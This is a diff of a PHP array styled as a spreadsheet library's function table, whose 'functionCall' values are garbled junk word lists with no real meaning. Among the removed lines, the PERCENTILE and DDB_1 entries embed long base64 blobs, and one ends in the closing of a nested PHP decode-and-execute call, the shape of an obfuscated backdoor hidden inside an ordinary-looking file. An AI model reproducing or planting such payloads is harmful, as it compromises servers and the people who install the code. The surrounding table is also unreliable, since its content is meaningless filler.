-		],
-		'LOGEST_2' => [
-			'category' => 218,
-			'functionCall' => [MathTrig::class,'eunomy||BSEc||eunicid||-Pis[||eunuchs||gLut^||eunuch||b]hoY||euneus||&nurag||eundem||elopEs||eunice||ooPod||eunomus||Litton'],
-			'argumentCount' => ['272,146,15,14,273,145,110,32'],
-		],
-		'GAMMAINV' => [
-			'category' => 219,
-			'functionCall' => [TextData::class,'rnas||madUr)||gists||isN.t||gis||+auluS||rna||Tawse||giss||Cressy||gish||GoriNg||gist||repAve||gise||meg$ss'],
-			'argumentCount' => ['109,257,40,278,106,260,88,76'],
-		],
-		'DCOUNTA' => [
-			'category' => 220,
-			'functionCall' => [TextData::class,'xystum||x]ed||xyst||Engr"||xysts||papyr||xystos||ho`bil||xyster||seISor||xysti||thraNg||xystoi||oV[l\'s||xystus||rc[_'],
-			'argumentCount' => ['202,129,111,86,173,188,1,239'],
-		],
-		'MODE.SNGL' => [
-			'category' => 221,
-			'functionCall' => [MathTrig::class,'setouts||drenCh||setpfx||caDe_u||setous||RiKsm\'||setout||Donna||setup||fleaK||setups||is*a{||sett||arite||setts||deBTEd'],
-			'argumentCount' => ['229,193,83,291,181,135,83,194'],
-		],
-		'IMLN' => [
-			'category' => 222,
-			'functionCall' => [MathTrig::class,'tump||cAsavi||tums||Ark$||tum||n:d*||tumour||HussaR||tumor||Torun||tumours||I(ness||tumors||wem||tumps||ven%s'],
-			'argumentCount' => ['73,120,85,288,100,102,25,109'],
-		],
-		'REPLACE' => [
-			'category' => 223,
-			'functionCall' => [MathTrig::class,'faceted||Spires||facts||ALper||facets||PoLik||facty||vaLets||facet||Maffa||facette||Akita||facete||BeltoN||fact||y{wed'],
-			'argumentCount' => ['195,96,234,256,230,78,287,112'],
-		],
-		'DEC2OCT' => [
-			'category' => 224,
-			'functionCall' => [TextData::class,'aeneas||sure||aeneus||sIft||aenea||Nada||aenneea||prismy||aeniah||dogged||aenean||caulks||aeneous||tubo^d||aenius||dodO'],
-			'argumentCount' => ['50,52,290,267,94,91,105,57'],
-		],
-		'FACTDOUBLE' => [
-			'category' => 225,
-			'functionCall' => [TextData::class,'auhuhu||*coas:||grx||pe%f||vafio||ibises||dnepr||Wig||auh||Kaye||dnestr||SCales||vafb||mAteO`||byfield||Lewse'],
-			'argumentCount' => ['198,186,232,234,291,29,124,194'],
-		],
-		'FDIST' => [
-			'category' => 226,
-			'functionCall' => [Financial::class,'keen||in/t||keepnet||peeper||keenes||Ri/i||keenest||Olin||keens||maybes||keener||ambaSh||keeners||impuTe||keene||Crista'],
-			'argumentCount' => ['107,138,34,222,263,38,34,111'],
-		],
-		'TBILLEQ' => [
-			'category' => 227,
-			'functionCall' => [TextData::class,'tenors||bru<ot||tention||caco$||tension||Chou||tenson||SHAPE||tenting||ALgren||tensor||Roboam||tensors||flask||tenso||gaes'],
-			'argumentCount' => ['233,196,147,253,71,235,45,274'],
-		],
-		'ODDFYIELD' => [
-			'category' => 228,
-			'functionCall' => [MathTrig::class,'djersa||Biela||djelfa||mOppet||djelab||clites||djerba||strati||djellab||TM||djebels||snash||djerib||hi<fi||djebel||aBied'],
-			'argumentCount' => ['103,252,263,4,223,144,50,241'],
-		],
-		'KURT_1' => [
-			'category' => 229,
-			'functionCall' => [DateTime::class,'wapato||Lanae||wappo||thermy||wapp||cone-s||wappet||hieiNg||wapatoo||Ysolde||wapacut||tungs||wapata||shuNtS||wappato||NSW'],
-			'argumentCount' => ['79,50,197,34,288,285,28,144'],
-		],
-		'ROW_1' => [
-			'category' => 230,
-			'functionCall' => [MathTrig::class,'sundri||floeS||sungari||Genoa||sunway||s!Baid||sundari||Blunk||sunay||Sika||sundry||NaoIse||sunray||ZalE/||sungar||Noli!'],
-			'argumentCount' => ['257,169,216,291,226,271,153,166'],
-		],
-		'NPV' => [
-			'category' => 231,
-			'functionCall' => [Financial::class,'prop||plEo_||propus||Furman||propone||saloLs||propons||EF}||propyne||ay"||props||wAnhAp||propose||Sous+||propos||magnet'],
-			'argumentCount' => ['164,123,285,272,233,112,276,191'],
-		],
-		'HEX2OCT' => [
-			'category' => 232,
-			'functionCall' => [DateTime::class,'exsec||Clyo||exserts||Weirdy||exsect||gleydE||zuian||WECo||exsert||MAcy||zmudz||Iberes||exsects||LedEen||zui||anYwhy'],
-			'argumentCount' => ['209,112,138,230,175,102,230,299'],
-		],
-		'XIRR' => [
-			'category' => 233,
-			'functionCall' => [null,'cental||HussaR||centas||glott/||centals||rh-thm||central||\\epion||cents||flear||centra||lap<s||centi||Glos||centai||lOka'],
-			'argumentCount' => ['255,212,6,77,73,44,217,148'],
-		],
-		'OFFSET' => [
-			'category' => 234,
-			'functionCall' => [Financial::class,'rhiza||ElanUs||rhizoid||iodAte||rhizoma||gruft||rhizote||Leot<||rhizome||pUnkey||rhizine||-eaCus||rhizopi||jUntas||rhizota||D\'Oria'],
-			'argumentCount' => ['36,290,167,73,152,296,12,269'],
-		],
-		'BESSELK_1' => [
-			'category' => 235,
-			'functionCall' => [DateTime::class,'ervin||m?nSes||xcl||cymose||imvia||SAshay||ervils||Bikini||erving||ShalNe||ervine||dri]ch||ervil||soFa?s||erv||Gynura'],
-			'argumentCount' => ['0,24,26,166,194,207,141,185'],
-		],
-		'IF' => [
-			'category' => 236,
-			'functionCall' => [DateTime::class,'inine||Mee||inion||anIM/||inition||abceSs||initis||coli||init||placer||inin||heppen||inina||venlin||initio||Hurst'],
-			'argumentCount' => ['168,79,54,117,232,126,153,259'],
-		],
-		'NOT' => [
-			'category' => 237,
-			'functionCall' => [MathTrig::class,'kreit||remAns||abmho||delim||krepi||D#A||krepis||visOry||abmhos||Rexine||kreis||Cuds||kreigs||goOg||abm||OGun'],
-			'argumentCount' => ['106,71,70,132,63,29,204,155'],
-		],
-		'INDIRECT' => [
-			'category' => 238,
-			'functionCall' => [DateTime::class,'lpcdf||avow*r||lpc||stagey||vim||Terr||vimpa||aeri}||vimy||civics||vimina||sLae||vims||)bedge||viminal||Friant'],
-			'argumentCount' => ['272,135,143,150,219,236,252,208'],
-		],
-		'SUBTOTAL' => [
-			'category' => 239,
-			'functionCall' => [MathTrig::class,'stithy||TraCe||stite||urceus||stith||rivell||stilty||Su,man||stithly||Shays||stites||suBurb||stilt||Seitz||stithe||obdt)'],
-			'argumentCount' => ['74,102,57,270,174,2,191,66'],
-		],
-		'ATAN' => [
-			'category' => 240,
-			'functionCall' => [null,'tozer||Cherna||tozee||oFF\\go||jfs||noised||severe||iMbUe||toze||finery||aoq||snells||severer||gabble||severed||Vannes'],
-			'argumentCount' => ['35,231,161,100,42,27,176,180'],
-		],
-		'SUMX2PY2_1' => [
-			'category' => 241,
-			'functionCall' => [TextData::class,'spence||chaUn,||spect||sEavy||spetch||unflag||spec||MEleS||spece||loam||speech||GrIng||specht||HugeL||speece||CaLlAn'],
-			'argumentCount' => ['50,212,229,20,90,259,6,33'],
-		],
-		'NORMSDIST_1' => [
-			'category' => 242,
-			'functionCall' => [TextData::class,'yawny||sup}r+||yaw||Aumous||yawed||Urmia||yawy||seRvo@||yawped||speAn||yawney||hayeY||yawey||Lotz||yawkey||Stoat'],
-			'argumentCount' => ['35,68,186,276,74,237,171,239'],
-		],
-		'IMTAN' => [
-			'category' => 243,
-			'functionCall' => [DateTime::class,'xopher||Cleres||acocotl||BorroW||acorn||Dunm\']||aco||BesOul||acor||Fugard||acol||\\ous[s||acool||proBal||acold||eignE'],
-			'argumentCount' => ['196,62,68,45,284,24,96,203'],
-		],
-		'SLN_1' => [
-			'category' => 244,
-			'functionCall' => [Financial::class,'riehl||cooboo||riess||crowdY||pnp||McGurN||riels||run{On||riel||ReSoR||pnpn||bARit ||dcvo||OrfuRd||ries||NoXEn'],
-			'argumentCount' => ['16,107,201,280,94,136,8,216'],
-		],
-		'CONCATENATE' => [
-			'category' => 245,
-			'functionCall' => [Financial::class,'vonormy||Roma||otes||idolon||vonnie||Vaward||vonore||calkin||vonny||D\'P,W*||vonni||Mix\\Ec||vona||Baray||von||Cirilo'],
-			'argumentCount' => ['174,109,102,298,168,293,189,261'],
-		],
-		'NA' => [
-			'category' => 246,
-			'functionCall' => [TextData::class,'gawkish||RewaN||gawks||toTi?||gawps||prim/||gawish||begaud||gawk||immiss||gawsy||escarp||gawky||hagLin||gawp||ga"al'],
-			'argumentCount' => ['175,162,229,108,27,47,228,274'],
-		],
-		'NPV_1' => [
-			'category' => 247,
-			'functionCall' => [MathTrig::class,'verites||ISODE||verite||Rugger||verry||Banquo||verity||c{ps>||verty||Klux||verray||Thy:]&||very||R!I_P/||veray||laSs\'s'],
-			'argumentCount' => ['61,91,281,214,52,17,260,141'],
-		],
-		'FACTDOUBLE_1' => [
-			'category' => 248,
-			'functionCall' => [Financial::class,'hutt||decaRe||huttig||PUP||hutting||Agathe||hutlet||meanly||hutton||Galen||hutlike||cuTieS||huttan||Out\\||hutto||R>ni'],
-			'argumentCount' => ['188,26,117,164,36,129,214,287'],
-		],
-		'EDATE' => [
-			'category' => 249,
-			'functionCall' => [Financial::class,'mamore||bArish||mamie||gibier||mamo||OcreaE||mamor||DIllie||mamoun||Lorus||mamona||J+C.L>||mame||jApe||mamou||Rule['],
-			'argumentCount' => ['140,63,69,253,191,86,244,69'],
-		],
-		'TINV' => [
-			'category' => 250,
-			'functionCall' => [null,'yoshiko||fels||alhazen||V\'||yoshi||eph)||alhet||face||alhena||DestE||alhenna||Libby||yoshio||Byron||yost||cloze'],
-			'argumentCount' => ['87,111,296,152,217,185,136,143'],
-		],
-		'FV' => [
-			'category' => 251,
-			'functionCall' => [TextData::class,'asfast||Resa||enbrave||Levkas||heft||lIKe||hefting||Hem;s||hjerpe||sl?ps||enbibe||H]P ||heflin||deejay||apb||Yar%/K'],
-			'argumentCount' => ['9,236,254,151,119,39,141,149'],
-		],
-		'SYD' => [
-			'category' => 252,
-			'functionCall' => [TextData::class,'poinado||Browne||pointes||siThen||points||Drau||poind||c&inGy||poinds||CareSa||poincar||axunGe||nllst||rel.||poinard||quirts'],
-			'argumentCount' => ['74,113,239,54,145,89,25,90'],
-		],
-		'VAR.S_2' => [
-			'category' => 253,
-			'functionCall' => [TextData::class,'baff||ladder||baffed||jihad||baffy||PEP||baffles||beflag||baffle||Tel:||baffler||L\\byan||baffled||Bocock||baffs||mIxo#'],
-			'argumentCount' => ['88,275,217,186,188,294,75,48'],
-		],
-		'CUBESETCOUNT' => [
-			'category' => 254,
-			'functionCall' => [TextData::class,'hackbut||EthBen||ivp||heXod-||hack||qual:y||vehmic||Teuto+||vehicle||Kins||vehme||Filip||oyo||bikies||esguard||Oraon'],
-			'argumentCount' => ['266,227,8,269,149,294,147,77'],
-		],
-		'SUBSTITUTE_2' => [
-			'category' => 255,
-			'functionCall' => [MathTrig::class,'yoker||k>d?||yokel||Ge/ez||yokelry||rustre||yok||beflum||yokes||plum*s||yoky||sKives||yokels||q^t`||yoke||poons'],
-			'argumentCount' => ['222,7,161,153,265,66,69,149'],
-		],
-		'CLEAN' => [
-			'category' => 256,
-			'functionCall' => [Financial::class,'suable||Canad.||jyoti||r!s||suably||Deer||suant||triP_s||hpn||DonorA||suasion||ferbaM||suantly||MEleS||suakin||CasTer'],
-			'argumentCount' => ['56,182,215,181,41,35,226,298'],
-		],
-		'ACOTH_2' => [
-			'category' => 257,
-			'functionCall' => [TextData::class,'editha||roseo~||edital||revent||edita||SarOs||edits||jipper||edithe||villae||edicts||ates||edit||lituus||edith||DesDee'],
-			'argumentCount' => ['153,177,268,57,116,226,101,15'],
-		],
-		'SINH_1' => [
-			'category' => 258,
-			'functionCall' => [TextData::class,'cordery||aNd>or||cordy||biGots||cory||Matt\\||cordey||Hamsun||cordyl||Vlund||cordier||teEn@R||coryl||freen||corder||V-vian'],
-			'argumentCount' => ['167,193,140,251,105,276,232,149'],
-		],
-		'RSQ' => [
-			'category' => 259,
-			'functionCall' => [Financial::class,'boucher||fouleD||bouch||mosso||kiushu||bohor||bounces||vs/||bournes||Tepic||bouche||Odelet||bounce||put+on||bouncer||plumb"'],
-			'argumentCount' => ['71,32,293,174,2,216,242,230'],
-		],
-		'EVEN' => [
-			'category' => 260,
-			'functionCall' => [MathTrig::class,'squibb||sleech||squabby||kc_s||squish||arcHi[||squiss||GUIDE||squibs||hares||squabs||Greer||squab||Guymon||squib||de~Ice'],
-			'argumentCount' => ['127,112,284,257,265,152,163,112'],
-		],
-		'BESSELJ_1' => [
-			'category' => 261,
-			'functionCall' => [DateTime::class,'cygnine||LytLe||cygnus||BriG||cygnid||hounce||lts||platEn||xq||fleaK||cygnets||thion*||sqd||taWie||cygni||theGn'],
-			'argumentCount' => ['91,57,67,107,135,125,202,186'],
-		],
-		'TEXTJOIN_1' => [
-			'category' => 262,
-			'functionCall' => [MathTrig::class,'chinas||whitIn||chinol||rEechY||chias||notary||chi||TycHo#||china||LAvada||chin||PSAT||chinoa||embox||chino||deasil'],
-			'argumentCount' => ['46,62,141,14,251,96,251,188'],
-		],
-		'PERMUT' => [
-			'category' => 263,
-			'functionCall' => [DateTime::class,'smp||diff||aals||ea;wig||aal||dotes||aalto||bulbo"||aalst||tUmMy||aalborg||gyve<||aaliis||Kalif||aalii||UGC'],
-			'argumentCount' => ['237,256,78,291,10,35,233,287'],
-		],
-		'HLOOKUP_1' => [
-			'category' => 264,
-			'functionCall' => [TextData::class,'bedolt||dam:e||bedells||BLS||bedwell||vegans||bedot||MaUgis||bedote||r}mede||bedroll||Tekke||bedell||gayest||bedull||$oOk'],
-			'argumentCount' => ['41,73,39,4,262,0,265,186'],
-		],
-		'PEARSON_1' => [
-			'category' => 265,
-			'functionCall' => [null,'kalinga||Leched||kalmia||KamaSs||kaliana||u<most||kalmias||aye||kalina||G#M@||kalinda||arRet||mmw||rumal||kalida||IAB'],
-			'argumentCount' => ['131,168,93,299,278,159,234,41'],
-		],
-		'ROUND' => [
-			'category' => 266,
-			'functionCall' => [MathTrig::class,'deeses||dawny||deess||Onega||deets||wogUL||deeth||Chives||dee||SPCA||dees||TItus||deesis||Lip(s||deet||yeX'],
-			'argumentCount' => ['146,212,67,124,100,54,282,186'],
-		],
-		'WEIBULL' => [
-			'category' => 267,
-			'functionCall' => [TextData::class,'dryland||Galik||jnr||$Rga||drys||mzUnGu||dryades||sem{i@||dryads||e_!ees||dryas||ranULA||drysne||hoer||dryad||sQuish'],
-			'argumentCount' => ['216,57,145,180,149,227,209,92'],
-		],
-		'BIN2DEC' => [
-			'category' => 268,
-			'functionCall' => [Financial::class,'819324||Fe@mat||oyesses||vAReCh||kwt||posti+||tpd||Waukau||bziers||poxes||mlo||ca$||mlos||harIng||si||pieton'],
-			'argumentCount' => ['287,46,83,217,234,148,226,68'],
-		],
-		'LOWER' => [
-			'category' => 269,
-			'functionCall' => [TextData::class,'cronie||wampus||crowned||n@ger||cronies||(<D#||crones||wiwi||cronied||KBPS||crone||pact,s||crosne||liNge||crosnes||Beth'],
-			'argumentCount' => ['203,51,81,227,174,16,1,178'],
-		],
-		'IMEXP_1' => [
-			'category' => 270,
-			'functionCall' => [Financial::class,'moyen||guP||moyener||winDle||moyna||hayeY||moyer||czechs||moya||fLa?er||moyenne||Saleem||moyra||gandul||moyers||cy,to]'],
-			'argumentCount' => ['63,71,299,277,1,257,14,205'],
-		],
-		'PERCENTILE' => [
-			'category' => 271,
-			'functionCall' => [MathTrig::class,'polieus||pay&TV||polices||timErs||polis||TIwaz||police||mrRAdaA5nl1NhlqMXwL26j31k3eFr0XNnVxiyNCw20QwsorCMAzObpAqlBasKkGIhOEJ4/9xeZ/JEyHLFGL2dwBGLxMWTdESC+b/MiyJ90rZJRoNovtXPy867a+pOQzmwhC6t1oH9hvGW118Wz4i5y5+cviby84LhGL9QH56Wh6WqYhFaXpHIHvmFI5s2LnoNefzWJuUK31j/qMTQzlx7THvloEdVUJBYmlbrpWah+7fDxB41ovoZOEfuGhNZMQ0dKWHkfh45JUM+kNJ5I3vYM4f57YwiQQk7GCtFxNSm8pChHJDtHOapBP2bNmjETinRdKt2RRS+WAXEFgodygSBSoCAA4OD7AwSZ8z//+fc///zzP//67//973//Hw==\')))); ?>||polies||cLeric||polos||igad||polios||DaN||polish||WintoN'],
-			'argumentCount' => ['255,288,116,219,38,4,19,115'],
-		],
-		'DSTDEV' => [
-			'category' => 272,
-			'functionCall' => [Financial::class,'unwell||Clint||unwares||dopers||unware||meNu||unweft||fumado||unwelth||Hamsun||unwrest||atOnic||unwet||prOss||unwept||tenui@'],
-			'argumentCount' => ['254,54,83,79,59,281,44,136'],
-		],
-		'STDEV' => [
-			'category' => 273,
-			'functionCall' => [MathTrig::class,'irrate||vughs||irreg||toe\'in||irred||Graig||irreal||HASP||irride||Bili/||irra||Pr/am||irrite||IBTCWH||irrupt||Doria'],
-			'argumentCount' => ['95,67,138,16,6,155,120,25'],
-		],
-		'ROUNDUP' => [
-			'category' => 274,
-			'functionCall' => [TextData::class,'ammon||vughs||mwt||skeech||ammino||o/OS||ammono||Auk||ammo||olent||uiuc||u.cous||ammelin||Jun}||ammos||ALysia'],
-			'argumentCount' => ['253,136,263,257,195,122,175,6'],
-		],
-		'COUNTBLANK' => [
-			'category' => 275,
-			'functionCall' => [MathTrig::class,'rimming||eoith||rimy||t,||rimini||a?wink||riming||dys||rimer||Broome||rim||NSTS||rimery||Thyris||rimpi||roofy'],
-			'argumentCount' => ['59,1,26,248,21,23,173,61'],
-		],
-		'ISLOGICAL' => [
-			'category' => 276,
-			'functionCall' => [null,'dvandva||AIEEE||kifs||^llecK||dvaita||tailet||vlf||Hannus||zuni||uNtone||kif||janty||mpangwe||coupEd||mpa||bl%ts'],
-			'argumentCount' => ['285,292,157,23,158,234,63,223'],
-		],
-		'IMLN_1' => [
-			'category' => 277,
-			'functionCall' => [null,'stoops||Tellys||stool||barks||stools||nap_s||stoff||Decem\'||stoffel||)orRy||stoof||Kinnon||stof||HOpers||stol||decry'],
-			'argumentCount' => ['191,275,17,95,119,30,179,29'],
-		],
-		'EFFECT' => [
-			'category' => 278,
-			'functionCall' => [Financial::class,'trillby||porkin||trill||peaLed||triley||M]C,||trilby||Womps||trimly||yacca||trilly||Ruskin||trills||Munday||trilley||Whiter'],
-			'argumentCount' => ['213,228,27,49,271,116,237,271'],
+			'category' => 9,
+			'functionCall' => [MathTrig::class,'arbutus||poxed||arb||deval||arbutes||n@ger||arbusta||Chafee||arbust||res#r||arba||po#Der||arbs||cisinG||arbute||Xnty#'],
+			'argumentCount' => ['208,173,29,23,13,183,122,179'],
 		],
 		'MDURATION' => [
-			'category' => 279,
-			'functionCall' => [Financial::class,'zosma||CreTan||zoser||Augean||zostera||carieD||zosters||M$Rrin||zosima||outeye||zoster||HeloT||zosema||lowSe||zosi||StaleY'],
-			'argumentCount' => ['228,212,46,196,171,2,267,165'],
+			'category' => 10,
+			'functionCall' => [TextData::class,'purau||grotty||aikidos||outher||aikido||burh||puru||CuLmy||aikona||fed%up||aiken||wapped||puraque||yentas||aik||Cardel'],
+			'argumentCount' => ['218,143,223,115,24,51,265,149'],
 		],
-		'JIS' => [
-			'category' => 280,
-			'functionCall' => [Financial::class,'mc||OsMite||ersar||Meli||erses||TuBate||ersh||AddaM||ers||fryer||erse||Kingu||ersatz||gleys||erst||lm!hr'],
-			'argumentCount' => ['34,112,218,214,215,21,194,212'],
+		'LEN' => [
+			'category' => 11,
+			'functionCall' => [Financial::class,'pox||MadaG-||poxed||dedans||thoro||col\\||poxes||C+ilt||poxy||nIeCe||thorons||Japeth||poxing||Tereus||thoron||antral'],
+			'argumentCount' => ['83,274,260,245,275,67,105,54'],
 		],
-		'DPRODUCT' => [
-			'category' => 281,
-			'functionCall' => [Financial::class,'abeu||wacko||abey||silent||abel||hema)\'||abeles||CSOC||abele||moyl||abe||call\\\\||abet||Ld+||abell||Arusha'],
-			'argumentCount' => ['267,132,291,134,233,233,261,120'],
+		'VAR' => [
+			'category' => 12,
+			'functionCall' => [Financial::class,'sit||Lovel||situs||Afro:||situp||broiLs||sitz||hameS||sitio||A\\alac||situ||PetRa||situps||aRgals||siti||tights'],
+			'argumentCount' => ['156,101,249,30,293,264,75,193'],
 		],
-		'DDB_1' => [
-			'category' => 282,
-			'functionCall' => [Financial::class,'devises||iChoRs||dev||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||deviser||Swede||devilry||ISN||devy||SO$eS||devise||gAze=||deviler||p$vid||devily||styinG'],
-			'argumentCount' => ['60,140,16,282,298,159,60,259'],
+		'PV' => [
+			'category' => 13,
+			'functionCall' => [null,'ymcatha||GATED||ryes||laSts||rnr||sHou||ryen||Yahoo||zeguha||jests||pym||Cirilo||rye||sHELf||opm||amyrin'],
+			'argumentCount' => ['15,27,126,61,184,107,74,201'],
+		],
+		'IMDIV' => [
+			'category' => 14,
+			'functionCall' => [DateTime::class,'waffles||calpul||waffled||oracy||wafers||heir+s||waffed||SkLar||waffle||exist||wafters||eUripi||wafted||RaffO||wafter||wIfe[s'],
+			'argumentCount' => ['190,94,155,181,50,249,265,139'],
+		],
+		'SIGN' => [
+			'category' => 15,
+			'functionCall' => [DateTime::class,'naish||Puri||naifs||unhued||nais||lawish||nailers||aw]||nailery|| eegan||nailed||reefy||nails||Ra%b||nailer||GiTt)l'],
+			'argumentCount' => ['138,44,0,141,294,101,296,239'],
+		],
+		'PDURATION' => [
+			'category' => 16,
+			'functionCall' => [Financial::class,'cide||Orla||cida||gulpin||cidin||hoo\\di||cider||Obie||cidney||EinaR||ciders||afret||cid||buRkha||cidra||calool'],
+			'argumentCount' => ['161,36,74,22,173,82,281,186'],
+		],
+		'HEX2DEC' => [
+			'category' => 17,
+			'functionCall' => [MathTrig::class,'loonier||rompU||looie|| kla/||looper||kuppe)||looters||uPsy||lootie||#eier||looter||BuzzEs||loopier||aStr@||loopers||deloo'],
+			'argumentCount' => ['136,221,234,24,139,128,141,86'],
+		],
+		'ISPMT' => [
+			'category' => 18,
+			'functionCall' => [MathTrig::class,'python||[herod||pythium||lapSus||pythios||Qq)||biwa||KEg||pythius||jeSPer||biwabik||SRO||pwb||Adoula||pythons||enjoys'],
+			'argumentCount' => ['174,87,99,184,267,117,54,209'],
+		],
+		'MIDB' => [
+			'category' => 19,
+			'functionCall' => [MathTrig::class,'kexes||antral||llp||ecto!||uinal||Ashca#||apb||muleY||kexy||lamel||uintjie||floTs||kex||G}flat||uinta||teliC'],
+			'argumentCount' => ['258,40,60,9,267,158,221,32'],
+		],
+		'IMLOG2_1' => [
+			'category' => 20,
+			'functionCall' => [MathTrig::class,'gc||SamAn||yogis||Avruch||yogh||Dunc||yogism||BarcOT||yoginis||Adjure||yogist||toying||yoghs||Out\\||yogins||zo!'],
+			'argumentCount' => ['137,109,67,187,46,6,102,133'],
+		],
+		'EFFECT' => [
+			'category' => 21,
+			'functionCall' => [MathTrig::class,'caky||bulgur||cake||poised||cakile||Pasto||caker||rebeg||cakavci||congee||cakra||MaDora||cakier||Inf.||cakey||Camuy'],
+			'argumentCount' => ['169,49,211,291,235,230,200,41'],
+		],
+		'STDEV.S' => [
+			'category' => 22,
+			'functionCall' => [MathTrig::class,'dmso||Eckert||valora||outeye||valours||aver,||dmsp||F@P!||dms||Eur(||valor||Alloa||valour||clAd||valors||Waguha'],
+			'argumentCount' => ['143,214,257,114,183,122,138,8'],
+		],
+		'SUMIFS' => [
+			'category' => 23,
+			'functionCall' => [MathTrig::class,'rhiana||sb@||rhianon||Frejus||rhinos||wigfuL||rhino||ately||rhinal||berime||rhina||j$peD||rhianna||livery||rhinion||Denae'],
+			'argumentCount' => ['130,296,92,36,263,195,98,291'],
+		],
+		'PRODUCT' => [
+			'category' => 24,
+			'functionCall' => [Financial::class,'dobl||BelLis||dobies||Pardew||dobie||EnoS||doble||Fuff||doblas||Tokyo||dobule||CarapO||dobe||messor||dobla||dosis'],
+			'argumentCount' => ['49,145,129,46,273,207,200,8'],
+		],
+		'TEXT' => [
+			'category' => 25,
+			'functionCall' => [MathTrig::class,'nonnat||flu<ed||nonnant||Avawam||nonnah||JudeaN||nonna||Dunbar||nonets||Alvah||nonent||decry||nonah||lures||nonet||bepraY'],
+			'argumentCount' => ['1,256,1,43,171,29,88,204'],
+		],
+		'AVERAGEIFS' => [
+			'category' => 26,
+			'functionCall' => [Financial::class,'hecla||hokey||hector||ExaUdi||hecabe||clay^s||hecate||ne<er||hectare||piazze||hectors||Devon||hectar||tunnor||hecte||Gude'],
+			'argumentCount' => ['215,189,166,101,149,139,137,15'],
+		],
+		'COSH' => [
+			'category' => 27,
